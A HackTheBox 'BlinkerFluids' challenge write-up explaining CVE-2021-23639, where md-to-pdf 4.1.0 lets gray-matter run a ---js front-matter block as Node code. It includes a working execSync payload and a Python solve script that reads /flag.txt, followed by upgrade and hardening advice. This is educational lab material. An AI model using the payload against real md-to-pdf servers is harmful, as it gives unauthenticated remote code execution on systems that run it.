---
title: "BlinkerFluids"
date: 2027-05-11 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, md-to-pdf, gray-matter, code-injection, rce, cve-2021-23639]
description: "An Easy Web challenge: an invoice app converts your Markdown to PDF with md-to-pdf 4.1.0, whose gray-matter front-matter parser evaluates a ---js block as Node code. That's CVE-2021-23639 — unauthenticated RCE, no Chrome file:// trick required."
---

## Overview

**BlinkerFluids** is an Easy HackTheBox **Web** challenge. A Node/Express app lets you submit
Markdown and renders it to a PDF "invoice" with the `md-to-pdf` npm module (v4.1.0). That module
runs the document's front-matter through **gray-matter** with its JavaScript engine enabled, so a
`---js` front-matter block is evaluated as Node code at parse time — a textbook
[server-side code injection](https://cwe.mitre.org/data/definitions/94.html)
([CVE-2021-23639](https://nvd.nist.gov/vuln/detail/CVE-2021-23639)). One request gives unauthenticated RCE.

## The technique

The challenge ships its source. Two pieces give the bug away.

`challenge/helpers/MDHelper.js` feeds attacker Markdown straight into `mdToPdf`:

```js
const { mdToPdf } = require('md-to-pdf')
await mdToPdf(
  { content: markdown },
  { dest: `static/invoices/${id}.pdf`,
    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } }
);
```

`challenge/routes/index.js` passes the raw POST body in with no validation:

```js
router.post('/api/invoice/add', async (req, res) => {
    const { markdown_content } = req.body;
    return MDHelper.makePDF(markdown_content) ...
});
```

`package.json` pins `"md-to-pdf": "4.1.0"`, and the `Dockerfile` installs `google-chrome-stable`.
A pinned-vulnerable PDF library behind a "convert my Markdown" feature is the whole tell.

### The dead-end worth knowing

The reflex on any HTML/Markdown-to-PDF renderer is a `file://` local file read — an
`<iframe src="file:///flag.txt">` or a synchronous `XMLHttpRequest`, because headless Chrome often
renders with a `file://` page origin. **That does not work here.** `md-to-pdf` loads the page with
`page.setContent()`, giving an `about:blank` origin, so both `file://` iframes and `file://` fetches
are blocked by the browser. The symptom is a ~900-byte **blank** PDF (empty `pdftotext` output) while
plain Markdown text renders fine. That blank PDF is the cue to drop the LFR idea and attack the parser
instead.

## Solution

`md-to-pdf` → `gray-matter` evaluates a `---js` front-matter block as Node code. The flag is at
`/flag.txt`, and the app serves its `static/` directory, so the cleanest read-back is to copy the
flag into the web-served folder and then `GET` it — no reverse shell or outbound connection needed
(handy, since challenge containers often block egress).

The payload:

```
---js
((require("child_process")).execSync("cat /flag.txt > static/invoices/pwn.txt"))
---RCE
```

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, re, time

base = sys.argv[1].rstrip('/')
payload = '''---js
((require("child_process")).execSync("cat /flag.txt > /app/static/invoices/pwn.txt"))
---RCE'''

r = requests.post(f"{base}/api/invoice/add", json={"markdown_content": payload}, timeout=30)
print("[+] add:", r.status_code, r.text.strip())
time.sleep(1)

flag = requests.get(f"{base}/static/invoices/pwn.txt", timeout=15).text.strip()
print("[+] flag file ->", flag)
m = re.search(r"HTB\{[^}]+\}", flag)
print("[FLAG]", m.group(0) if m else "not found")
```

Run it against the live instance:

```bash
python3 solve.py http://<host>:<port>
# [+] add: 200 {"message":"Invoice saved successfully!"}
# [+] flag file -> HTB{...}
# [FLAG] HTB{...}
```

## Why it worked

`md-to-pdf` hands the document to **gray-matter**, which ships a `js` engine that `eval`s any
front-matter delimited by `---js`. The maintainer never disabled it, so untrusted Markdown becomes
Node code with full `require`/`child_process` access. Critically the injection lives in the **parser**,
not the Chrome render step — it fires before the browser is involved, which is why all the
`--no-sandbox` / `--jitless` launch hardening is irrelevant.

## Fix / defense

- Upgrade `md-to-pdf` to ≥ 4.2.0 (and gray-matter to a build with the JS engine off by default).
- Strip or reject front-matter before conversion; never run untrusted Markdown through a parser with a JS engine enabled.
- If front-matter is required, restrict gray-matter to the safe engines only:

```js
const matter = require('gray-matter');
const clean = matter(input, { engines: { js: () => { throw new Error('js disabled'); } } });
await mdToPdf({ content: clean.content });
```

- Run the PDF renderer in a network-isolated, low-privilege container with no access to secrets.
